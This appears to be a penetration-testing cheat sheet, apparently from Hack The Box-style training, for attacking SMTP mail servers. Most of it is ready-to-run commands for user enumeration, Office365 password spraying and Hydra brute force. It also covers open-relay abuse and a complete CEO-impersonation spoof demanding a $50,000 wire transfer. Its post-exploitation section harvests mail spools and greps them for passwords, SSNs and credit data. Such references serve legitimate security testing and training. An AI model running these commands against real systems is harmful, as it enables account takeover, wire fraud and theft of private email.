# Simple Mail Transfer Protocol (SMTP) 

## Detection

### nmap
```
nmap -p 25,465,587 target.com
nmap -sV -sC -p 25,465,587
```

### DNS Lookup for mail servers for the specified domain
```
host -t MX microsoft.com
```

### DNS lookup for mail servers for the specified domain.
```
dig mx inlanefreight.com | grep "MX" | grep -v ";"
```

### DNS lookup of the IPv4 address for the specified subdomain.
```
host -t A mail1.inlanefreight.htb
```

### Connect to SMTP Server
```
telnet 10.10.110.20 25
```

## Banner Grabbing

### Using netcat
```
nc target.com 25
```

### Get banner with EHLO
```
echo "EHLO test" | nc target.com 25
```

### Using telnet
```
telnet target.com 25
```

### Using nmap
```
nmap -p 25 -sV target.com
```


## Enumeration

### nmap
```
# Enumerate supported SMTP commands
nmap -p 25 --script smtp-commands target.com

# Test for user enumeration via VRFY/EXPN
nmap -p 25 --script smtp-enum-users target.com

# Extract NTLM authentication details
nmap -p 25 --script smtp-ntlm-info target.com

# Run all SMTP-related scripts
nmap -p 25,465,587 --script smtp-* target.com
```

## User Enumeration

### VRFY Command

#### Manual testing with telnet
```
telnet target.com 25
VRFY admin
VRFY root
VRFY user
```

#### Using smtp-user-enum
```
smtp-user-enum -M VRFY -U users.txt -t target.com
```

### EXPN Command

#### Expand Mailing List
```
telnet target.com 25
EXPN admin
EXPN all
EXPN staff
```

#### Using smtp-user-enum
```
smtp-user-enum -M EXPN -U users.txt -t target.com
```

### RCPT TO Command
#### Check if user exists
```
telnet target.com 25
MAIL FROM:<test@example.com>
RCPT TO:<admin@target.com>
# 250 OK = user exists
# 550 User unknown = doesn't exist
```

#### Using smtp-user-enum
```
smtp-user-enum -M RCPT -U users.txt -t target.com -f sender@example.com 
smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t 10.129.203.7
```
#### Verify the usage of Office365 for the specified domain
```
python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz
```

#### Enumerate existing users using Office365 on the specified domain
```
python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz
```

#### Password spraying against a list of users that use Office365 for the specified domain.
```
python3 o365spray.py --spray -U usersfound.txt -p 'March2022!' --count 1 --lockout 1 --domain msplaintext.xyz
```

## Command Enumeration
### Get Supported Commands
```
telnet target.com 25
EHLO attacker.com

# Response shows:
# 250-SIZE
# 250-VRFY
# 250-ETRN
# 250-STARTTLS
# 250-AUTH PLAIN LOGIN
# 250 HELP
```

## Open Relay Testing

### External to External
```
telnet target.com 25
MAIL FROM:<external1@example.com>
RCPT TO:<external2@anotherdomain.com>
DATA
Test
.

# If accepts, it's an open relay
```
### Using nmap
```
nmap -p 25 --script smtp-open-relay target.com
```

### Using swaks
```
swaks --to external@domain.com --from external@otherdomain.com --server target.com
swaks --from notifications@inlanefreight.com --to employees@inlanefreight.com --header 'Subject: Notification' --body 'Message' --server 10.10.11.213
```

## Email Spoofing
### Spoof Email from CEO
```
telnet target.com 25
EHLO attacker.com
MAIL FROM:<ceo@target.com>
RCPT TO:<employee@target.com>
DATA
From: CEO <ceo@target.com>
To: employee@target.com
Subject: Urgent: Wire Transfer

Please transfer $50,000 to account XYZ immediately.
.
QUIT
```

### Using sendemail
```
sendemail -f ceo@target.com -t employee@target.com \
  -u "Urgent: Wire Transfer" \
  -m "Please transfer funds..." \
  -s target.com:25
```

## Brute Force Attacks
### Hydra (see also hydra cheatsheet)
```
hydra -l user@target.com -P passwords.txt smtp://target.com:587
hydra -L users.txt -P passwords.txt smtp://target.com:587
```
### Metasploit
```
use auxiliary/scanner/smtp/smtp_enum
set RHOSTS target.com
run
```

## Post-Exploitation

### Email Harvesting
```
# if access to mail server

# Read mail spool
cat /var/mail/username
cat /var/spool/mail/username

# Maildir format
ls -la /home/username/Maildir/cur/
cat /home/username/Maildir/cur/*

# Extract email addresses
grep -Eiorh '\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b' /var/mail/*
```
### Data Exfiltration
```
# Search for sensitive keywords
grep -r -i "password\|secret\|confidential" /var/mail/

# Extract attachments
find /var/mail/ -name "*.pdf" -o -name "*.doc" -o -name "*.xls"

# Extract financial information
grep -r -i "account\|routing\|ssn\|credit" /var/mail/
```

## Common SMTP commands
| Command    | Description        | Usage                          |
|-----------|--------------------|--------------------------------|
| HELO      | Identify client    | HELO client.com                |
| EHLO      | Extended HELO      | EHLO client.com                |
| MAIL FROM | Sender address     | MAIL FROM:<sender@domain.com>  |
| RCPT TO   | Recipient          | RCPT TO:<recipient@domain.com> |
| DATA      | Message content    | DATA                           |
| VRFY      | Verify user        | VRFY admin                     |
| EXPN      | Expand list        | EXPN all                       |
| RSET      | Reset              | RSET                           |
| NOOP      | No operation       | NOOP                           |
| QUIT      | Close              | QUIT                           |